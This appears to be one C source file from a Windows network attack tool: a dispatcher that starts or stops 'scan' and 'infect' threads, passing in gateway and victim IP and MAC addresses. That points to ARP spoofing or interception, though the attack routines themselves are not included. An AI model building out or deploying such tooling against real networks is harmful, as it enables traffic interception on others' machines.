#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "infect.h"
#include "scan.h"
#include "commands.h"
#include "network_headers.h"


//globals
static HANDLE act_threads[ACTS_NUM];
extern send_params infect_params;

void execute_command(pCommand command)
{	
	switch (command->act)
	{
	case SCAN:
		//check if thread not active
		if (WaitForSingleObject(act_threads[SCAN], 0) != WAIT_OBJECT_0)
		{
			act_threads[SCAN] = CreateThread(
				NULL,
				0,
				scan,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case INFECT:
		//check if thread not active
		if (WaitForSingleObject(act_threads[INFECT], 0) != WAIT_OBJECT_0)
		{
			infect_params.gateway_ip = command->gateway_ip;
			infect_params.victim_ip = command->victim_ip;
			memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
			memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);

			act_threads[INFECT] = CreateThread(
				NULL,
				0,
				infect,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case STOP_S:
		TerminateThread(act_threads[SCAN], 0);
		break;
	case STOP_I:
		TerminateThread(act_threads[INFECT], 0);
		break;
	case STOP_A:
		TerminateThread(act_threads[SCAN], 0);
		TerminateThread(act_threads[INFECT], 0);
		break;
	}
	
}